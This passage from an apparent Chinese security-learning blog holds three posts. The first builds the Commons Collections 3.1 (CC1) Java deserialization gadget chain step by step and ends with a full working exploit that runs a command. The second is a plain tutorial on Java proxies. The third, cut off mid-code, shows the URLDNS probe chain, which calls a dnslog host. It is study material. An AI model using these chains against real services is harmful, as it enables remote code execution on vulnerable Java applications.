&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.1&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>pom.xml:</p><pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;org.example&lt;/groupId&gt;  &lt;artifactId&gt;CC1&lt;/artifactId&gt;  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;  &lt;packaging&gt;jar&lt;/packaging&gt;  &lt;name&gt;CC1&lt;/name&gt;  &lt;url&gt;http://maven.apache.org&lt;/url&gt;  &lt;properties&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;  &lt;/properties&gt;  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</code></pre><h2 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h2><p>找这条链子的最终目的是为了执行任意命令，比如说弹个计算器<code>calc</code></p><p>最简单的方法是</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>通过反射方式实现：</p><pre><code class="java">Runtime r = Runtime.getRuntime();Class c =Runtime.class;Method execMethod  = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;calc&quot;);</code></pre><p>这里，我们不能够简单的实现这样的功能，而是找到一条链子，通过一层层的调用来执行命令</p><p>首先，要找到漏洞点</p><p>在<code>Apache Commons Collections</code>库中，里面有一个Transformer.java ,里面就这点东西</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554657.png" alt="image-20230404173415777"></p><p>这段代码定义了一个接口叫做 Transformer，它是一种用于类型转换或者提取数据的函数接口。该接口中只有一个单独的方法 transform(Object input) ，用于将输入对象转换成输出对象，而不改变输入对象本身。</p><p>查看一下实现Transformer的方法，总共有14个，漏洞点在<code>InvokerTransformer</code>里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555827.png" alt="image-20230404174817485"></p><p>跟进InvokerTransformer.java里，查看它的transform方法：</p><pre><code class="java">public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125;        try &#123;            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);                        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);        &#125;    &#125;</code></pre><p>首先，该方法会判断输入对象是否为空，如果为空则直接返回 null。</p><p>如果输入对象不为空，则会获取其所属的类，并根据传入的方法名以及参数类型，反射获取该方法的 Method 对象。接下来，通过 method.invoke() 方法，对原输入对象调用该方法并传入参数，得到转换后的结果对象，并将其返回。</p><p>在这里我们可以看到刚刚反射执行<code>calc</code>的影子，并且<code>iMethodName (方法名)</code>，<code>iParamTypes (参数类型) </code>，<code>iArgs (参数)</code>都是可控的，可以实现任意方法调用</p><p>往上寻找它的构造函数：</p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    &#125;</code></pre><p>可以尝试用这个方法弹个计算器</p><pre><code class="java"> Runtime r = Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;).transform(r);</code></pre><p>成功执行！</p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555629.png" alt="image-20230404190713998" style="zoom:50%;" /><p>现在相当于获取了链子的末端[危险方法：transform]，看看有哪些类调用了transform，这样我们才能往上走，Alt+F7</p><p>可以看到有19个调用，经过一番查找，找到TransformedMap</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555610.png" alt="image-20230404192653822"></p><pre><code class="java">protected Object checkSetValue(Object value) &#123;     return valueTransformer.transform(value); &#125;</code></pre><p><code>valueTransformer</code>是构造函数传来的，<code>value</code>还不能确定能不能控制</p><p>查看<code>TransformedMap</code>的构造函数：</p><pre><code class="java">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;   super(map);   this.keyTransformer = keyTransformer;   this.valueTransformer = valueTransformer;&#125;</code></pre><p>该方法继承自 Map 接口的实现类，用于对 Map 中的 key 和 value 进行转换操作。其中，构造方法接收一个 Map 对象 map，以及两个 Transformer 对象 keyTransformer 和 valueTransformer，分别用于对 Map 中的 key 和 value 进行转换</p><p>因为这个构造函数是<code>protected</code>类型的，只能在类内部和子类中访问，看看哪个方法调用了它</p><p>直接往上一个方法就看到了,这里直接完成了上一个函数的操作，并且是<code>public static</code></p><pre><code class="java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;      return new TransformedMap(map, keyTransformer, valueTransformer); &#125;</code></pre><p>到这里，我们是可以直接调用<code>decorate</code>方法，但是还没找到让程序执行到<code>checkSetValue</code> 的方式</p><p>查看一下有哪些方法调用了<code>checkSetValue</code>,直接Alt+F7</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555228.png" alt="image-20230404200924860"></p><p>找到了，并且只有一个，在<code>AbstractInputCheckedMapDecorator.java</code>中,如下</p><pre><code class="java">static class MapEntry extends AbstractMapEntryDecorator &#123;        /** The parent map */        private final AbstractInputCheckedMapDecorator parent;        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;            super(entry);            this.parent = parent;        &#125;        public Object setValue(Object value) &#123;            value = parent.checkSetValue(value);            return entry.setValue(value);        &#125;    &#125;</code></pre><p>并且发现<code>AbstractInputCheckedMapDecorator</code>是TransformedMap的父类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555347.png" alt="image-20230404201443638"></p><p>再看看有哪些地方调用了<code>setValue</code>方法，Alt+F7，发现有好多</p><p>经过大佬讲解，这个<code>MapEntry</code>名字已经给出了提示，大概就是遍历map的键值对时就会调用这个方法，这里的setValue()其实是被重写了的entry.setValue()</p><pre><code class="java">for(Map.Entry entry:Map.entrySet()) //遍历map&#123;    entry.getValue();&#125;   </code></pre><p>到这里应该通透了，可以试试用这个来弹计算器</p><pre><code class="java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);for(Map.Entry entry:transformedMap.entrySet())  &#123;    entry.setValue(r);  &#125;</code></pre><p>OK,没猫病</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555088.png" alt="image-20230404203335268"></p><p>到现在已经找到后半条链了，现在要找到一个遍历Map的地方，并且使用了setValue()，就可以执行后面的链子了</p><p>继续找调用了setValue()的不同类，最好找到满足条件并且在readObject方法下的， 通过Alt+F7直接找到setValue()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555770.png" alt="image-20230405102345558"></p><p>在sun.reflect.annotation下发现了readObject⽅法，点进去查看，发现刚好满足条件，遍历集合，重写了readObject(),并且调用了setValue(),</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555873.png" alt="image-20230405102543904"></p><p>查看一下这个类的构造函数</p><p>构造⽅法传⼊两个参数，第⼀个是注解，第⼆个是map集合这个我们可以控制</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051555799.png" alt="image-20230405103639780"></p><p>该类使⽤了class修饰 所以访问需要当前包下，这⾥需要使⽤反射加载才能调⽤这个构造⽅法</p><p>目前流程大概是这样子的：</p><pre><code class="java">Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);annotationInvocationHandlConstructor.setAccessible(true);serialize(o);unserialize(&quot;ser.bin&quot;);</code></pre><p>serialize和unserialize如下：</p><pre><code class="java">public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;</code></pre><p>⼤致是这样的，但是⽆法运⾏，因为序列化必须继承Serializable接⼝，Runtime ⽆法序列化，并且setValue的值⽆法控制</p><p>还有就是遍历map中需要绕过两个if判断</p><p>问题多多，需要一个个解决</p><p>先解决Runtime问题</p><p>虽然Runtime⽆法序列化，但是<code>Runtime.class</code>是可以序列化的</p><pre><code class="java">Class c = Runtime.class;Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Runtime r = (Runtime) getRuntime.invoke(null, null);Method exec = c.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;);</code></pre><pre><code class="java">//将上面的代码转换一下Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></pre><p>这里可以发现，前一段的代码的输出，是后一段代码的输入，递归调用</p><p>有一个方法可以实现它</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556062.png" alt="image-20230405112001531"></p><p>只要传入要调用的方法的数组就行</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;   new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),   new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),   new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class);</code></pre><p>正常执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556399.png" alt="image-20230405112757891"></p><p>这里修改过后，后面的也需要更改</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;     new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),     new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),     new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//chainedTransformer.transform(Runtime.class);//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);annotationInvocationHandlConstructor.setAccessible(true);Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);serialize(o);unserialize(&quot;ser.bin&quot;);</code></pre><p>现在还不能正常运行，还需要解决两个判断条件：</p><p>经过调试，发现已经进入两个判断了</p><p>！这咋和教程里的不一样，大佬调试的还没进判断里，我的就进去了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556765.png" alt="image-20230405115955396"></p><p>可能是我的jdk版本问题，我的是jdk 8u361，建议用下面的</p><p>环境jdk 8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>用大佬的图，继续</p><p>在上面的代码可以看出两个if 分别是检测key中的value是否为空，第⼆个if是判断参数是否强转</p><p>这⾥打个断点调试下</p><p>看到这⾥的memberType是传⼊的注解 Override，成员变量为空</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556123.png" alt="image-20230405151509078"></p><p>这⾥的memberValue是map中的Override，通过这个Override寻找这个value，下⼀步后，直接跳出判断，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556077.png" alt="image-20230405151707774"></p><p>Override是单独的接⼝，没有成员⽅法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556475.png" alt="image-20230405151819169"></p><p>这⾥换成其他注解 Target</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556370.png" alt="image-20230405151852079"></p><pre><code class="java">修改前：Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);修改后：Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);</code></pre><p>替换后重新断点,发现找到了参数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556732.png" alt="image-20230405152131419"></p><p>这⾥第⼆个if也成功绕过</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556195.png" alt="image-20230405153735429"></p><p>还有一个问题，就是参数控制setValue的参数控制</p><p>点击setValue 进来，跳转到transformmap中的checkSetValue⽅法，value为固定的，⽆法控制执⾏任意类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556466.png" alt="image-20230405154030512"></p><p>在⼀开始查找transform时，会有⼀个ClosureTransformer类，这⾥的transform传递的参数不论是什么，都会返回⼀个常量，因此通过这个进⾏覆盖。</p><p>原本调⽤valueTransformer.transform(Object)，中途在换 ClosureTransformer.transform(Object) 只要最终调⽤到transform(Object)就可以执⾏任意类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051556411.png" alt="image-20230405154346613"></p><p>在数组中添加⼀下代码，把value替换为Runtime.class即可执⾏命令</p><pre><code>new ConstantTransformer(Runtime.class)</code></pre><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>这就是最终的调⽤链,在最终调⽤transform的时候，⽤的是不同类的同名函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304051557054.png" alt="image-20230405154532332"></p><p>exp:</p><pre><code class="java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class demo &#123;    public static void main(String[] args) throws Exception &#123;        //代码执行        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,                        Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,                        Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]                        &#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        //遍历map        HashMap&lt;Object,Object&gt; map = new HashMap();        map.put(&quot;value&quot;,&quot;aaa&quot;);        Map&lt;Object,Object&gt; transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);                        //反射调用        Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);        annotationInvocationHandlConstructor.setAccessible(true);        Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);        //序列化与反序列化        serialize(o);        unserialize(&quot;ser2.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException&#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser2.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代理与动态代理</title>
      <link href="/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2023/04/02/Java%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代理与动态代理"><a href="#Java代理与动态代理" class="headerlink" title="Java代理与动态代理"></a>Java代理与动态代理</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304031625114.png" alt="代理模式UML类图"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理是一种代理模式，它在程序运行之前就已经存在代理类的字节码文件，所以又称为编译时代理或者普通代理。在使用静态代理模式时，需要手动编写代理类，并在其中实现目标对象的方法调用。</p><p>下面举个例子： 黄*杰学长给学弟Tree买饭，买饭回来的路上还去买了奶茶</p><p>getrice.java 定义一个接口“买饭”</p><pre><code class="java">//抽象对象：买饭public interface getrice &#123;    public void Getrice();&#125;</code></pre><p>Person.java 真实角色, 实现getrice接口</p><pre><code class="java">public  class Person implements getrice &#123;    public void Getrice() &#123;        System.out.println(&quot;买饭&quot;);    &#125;&#125;</code></pre><p>StaticProxy.java 静态代理, </p><pre><code class="java">public class StaticProxy implements getrice&#123;    private Person person;    public StaticProxy(Person person)    &#123;        this.person = person;    &#125;    public void Getrice()    &#123;        person.Getrice();        System.out.println(&quot;路上买杯奶茶&quot;);        System.out.println(&quot;把饭拿给学弟&quot;);    &#125;&#125;</code></pre><p>Client.java</p><pre><code class="java">public class Client &#123;    public static void main(String[] args) &#123;        //Tree要吃饭        Person Tree = new Person();        //找到在食堂吃饭的黄*杰学长帮忙带个饭        StaticProxy jie = new StaticProxy(Tree);        //学长买饭        jie.Getrice();    &#125;&#125;</code></pre><p>结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304031625967.png" alt="image-20230403134900494"></p><p>在这个买饭的过程中，客户端Tree接触的是黄*杰（代理），看不到“饭”，当任然能买到饭。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>相对于静态代理而言，动态代理是一种更为灵活的代理模式。在使用动态代理时，代理类并不是在程序运行之前就已经存在，而是在运行时通过反射等机制动态生成。Java中实现动态代理需要借助java.lang.reflect包中的Proxy类和InvocationHandler接口。</p><p>动态代理的出现就是为了解决传统静态代理模式的中的缺点。</p><p>具备代理模式的优点的同时，巧妙的解决了静态代理代码冗余，难以维护的缺点。</p><p>在Java中常用的有如下几种方式：</p><h3 id="JDK-原生动态代理"><a href="#JDK-原生动态代理" class="headerlink" title="JDK 原生动态代理"></a>JDK 原生动态代理</h3><p>getrice.java和Person.java代码不变</p><ol><li>首先实现一个InvocationHandler，方法调用会被转发到该类的invoke()方法。</li><li>然后在需要使用getrice的时候，通过JDK动态代理获取getrice的代理对象。</li></ol><p>DynamicProxy.java:</p><pre><code class="java">import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class DynamicProxy implements InvocationHandler &#123;    private Object target;    public  DynamicProxy(Object target) &#123;        this.target = target;    &#125;    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        Object result = method.invoke(target, args);        System.out.println(&quot;路上买杯奶茶&quot;);        System.out.println(&quot;把饭拿给学弟&quot;);        return result;    &#125;&#125;</code></pre><p>客户使用动态代理调用</p><p>Client.java</p><pre><code class="java">import java.lang.reflect.Proxy;public class Client &#123;    public static void main(String[] args) &#123;        getrice Tree = new Person();        DynamicProxy jie = new DynamicProxy(Tree);        getrice proxy = (getrice) Proxy.newProxyInstance(                Tree.getClass().getClassLoader(),                Tree.getClass().getInterfaces(),                jie);        proxy.Getrice();    &#125;&#125;</code></pre><p>运行结果是和上面的一样的</p><p>上述代码的核心关键是<code>Proxy.newProxyInstance</code>方法，该方法会根据指定的参数动态创建代理对象。</p><p>它三个参数的意义如下：</p><ol><li><code>loader</code>，指定代理对象的类加载器</li><li><code>interfaces</code>，代理对象需要实现的接口，可以同时指定多个接口</li><li><code>handler</code>，方法调用的实际处理者，代理对象的方法调用都会转发到这里</li></ol><p><code>Proxy.newProxyInstance</code>会返回一个实现了指定接口的代理对象，对该对象的所有方法调用都会转发给<code>InvocationHandler.invoke()</code>方法。</p><p>因此，在<code>invoke()</code>方法里我们可以加入任何逻辑，比如修改方法参数，加入日志功能、安全检查功能等等……</p><p>getClass().getClassLoader()：</p><p>getClass() 方法是 Java Object 类中的一个方法，它的作用是返回当前对象所属类的 Class 对象。而 getClassLoader() 则是 Class 类中的一个方法，它可以用来获取该类的类加载器。在这段代码中，getClass().getClassLoader() 表示获取当前对象所属类的类加载器。具体来说，getClass() 方法会返回 DynamicProxy 类的 Class 对象，而 getClassLoader() 方法则会获取该类的类加载器。</p><h3 id="cglib-动态代理"><a href="#cglib-动态代理" class="headerlink" title="cglib 动态代理"></a>cglib 动态代理</h3><p>JDK动态代理是基于接口的,如果没有接口，就用cglib 动态代理</p><p><a href="https://github.com/cglib/cglib">CGLIB</a>(<em>Code Generation Library</em>)是一个基于<a href="http://www.baeldung.com/java-asm">ASM</a>的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB通过继承方式实现代理。</p><p>首先，我们需要引入CGLIB库，例如Maven项目中的依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;cglib&lt;/groupId&gt;    &lt;artifactId&gt;cglib&lt;/artifactId&gt;    &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>然后，我们定义一个类<code>HelloService</code>，不需要实现任何接口：</p><pre><code class="java">public class HelloService &#123;    public void sayHello() &#123;        System.out.println(&quot;Hello World!&quot;);    &#125;&#125;</code></pre><p>接着，定义一个实现<code>MethodInterceptor</code>接口的代理处理器<code>HelloServiceProxy</code>：</p><pre><code class="java">import net.sf.cglib.proxy.MethodInterceptor;import net.sf.cglib.proxy.MethodProxy;import java.lang.reflect.Method;public class HelloServiceProxy implements MethodInterceptor &#123;    @Override    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123;        System.out.println(&quot;Before sayHello&quot;);        Object result = proxy.invokeSuper(obj, args);        System.out.println(&quot;After sayHello&quot;);        return result;    &#125;&#125;</code></pre><p>最后，在<code>main</code>方法中使用代理对象调用原始对象方法：</p><pre><code class="java">import net.sf.cglib.proxy.Enhancer;public class Main &#123;    public static void main(String[] args) &#123;        HelloService helloService = new HelloService();        Enhancer enhancer = new Enhancer();        enhancer.setSuperclass(HelloService.class);        enhancer.setCallback(new HelloServiceProxy());        HelloService proxy = (HelloService) enhancer.create();        proxy.sayHello();    &#125;&#125;</code></pre><p>输出结果：</p><pre><code class="html">Before sayHelloHello World!After sayHello</code></pre><p>其实CGLIB和JDK代理的思路大致相同</p><p>上述代码中，通过CGLIB的<code>Enhancer</code>来指定要代理的目标对象、实际处理代理逻辑的对象。</p><p>最终通过调用<code>create()</code>方法得到代理对象，对这个对象所有非final方法的调用都会转发给<code>MethodInterceptor.intercept()</code>方法。</p><p>在<code>intercept()</code>方法里我们可以加入任何逻辑，同JDK代理中的<code>invoke()</code>方法</p><p>通过调用<code>MethodProxy.invokeSuper()</code>方法，我们将调用转发给原始对象，具体到本例，就是<code>Landlord</code>的具体方法。CGLIG中<code>MethodInterceptor</code>的作用跟JDK代理中的<code>InvocationHandler</code>很类似，都是方法调用的中转站。</p><h3 id="javasist-动态代理"><a href="#javasist-动态代理" class="headerlink" title="javasist 动态代理"></a>javasist 动态代理</h3><p>偷懒</p><p>pass</p><h2 id="静态代理和动态代理的区别"><a href="#静态代理和动态代理的区别" class="headerlink" title="静态代理和动态代理的区别"></a>静态代理和动态代理的区别</h2><p>静态代理：由程序员创建或者是由特定工具创建，在代码编译时就确定了被代理的类是一个静态代理。静态代理通常只代理一个类；<br>动态代理：在代码运行期间，运用反射机制动态创建生成。动态代理代理的是一个接口下的多个实现类。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS利用链</title>
      <link href="/2023/04/01/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2023/04/01/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS利用链"><a href="#URLDNS利用链" class="headerlink" title="URLDNS利用链"></a>URLDNS利用链</h1><p>URLDNS利用链是java原生的一条利用链，通常用来验证是否存在反序列化漏洞，因为是原生的，所以不存在版本限制</p><p>特点:</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>HashMap 是一个存储键值对的容器。 每个键与一个值关联。 <code>HashMap</code>中的键必须唯一。 <code>HashMap</code>在其他编程语言中称为关联数组或词典。 <code>HashMaps</code>占用更多内存，因为每个值还有一个键。 删除和插入操作需要固定的时间。 <code>HashMaps</code>可以存储空值。</p><p>基本用法：</p><p>创建对象</p><pre><code class="java">HashMap&lt;String,Integer&gt; hashMap = new HashMap&lt;&gt;();</code></pre><p>添加键值对：</p><pre><code class="java">hashMap.put(&quot;aa&quot;,1);hashMap.put(&quot;bb&quot;,2);hashMap.put(&quot;cc&quot;,3);</code></pre><p>put方法会覆盖原有的value，而另一种put方法不会覆盖：putIfAbsent(key,value)</p><pre><code class="java">hashMap.putIfAbsent(&quot;aa&quot;,4);</code></pre><p>该方法首先会判断key是否存在，如果存在且value不为null，则不会覆盖原有的value，并返回原来的value；如果key不存在或者key的value为null，则会put进新值，并返回null。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><strong>HashMap.readObject()–&gt;HashMap.putVal()–&gt;HashMap.hash()–&gt;URL.hashcode()–&gt;URLStreamHandler().hashCode().getHostAddress()–&gt;URLStreamHandler().hashCode().getHostAddress().getByName()</strong> </p><pre><code class="java">1. HashMap --&gt; readObject()2. HashMap --&gt; hash()3. URL --&gt; hashCode()4. URLStreamHandler --&gt; hashCode()5. URLStreamHandler --&gt; getHostAddress()6. InetAddress --&gt; getByName()</code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="java">import java.lang.reflect.Field;import java.util.HashMap;import java.net.URL;import java.io.*;public class Test &#123;    public static void main(String[] args) throws Exception &#123;    HashMap&lt;URL,Object&gt; hashMap=new HashMap&lt;&gt;();    URL url = new URL(&quot;http://7zswrn.dnslog.cn&quot;);    Field field= url.getClass().getDeclaredField(&quot;hashCode&quot;);    field.setAccessible(true);    field.set(url,123);    hashMap.put(url,1);    field.set(url,-1);    new ObjectOutputStream(new FileOutputStream(&quot;bin.ser&quot;)).writeObject(hashMap);    Object o = new ObjectInputStream(new 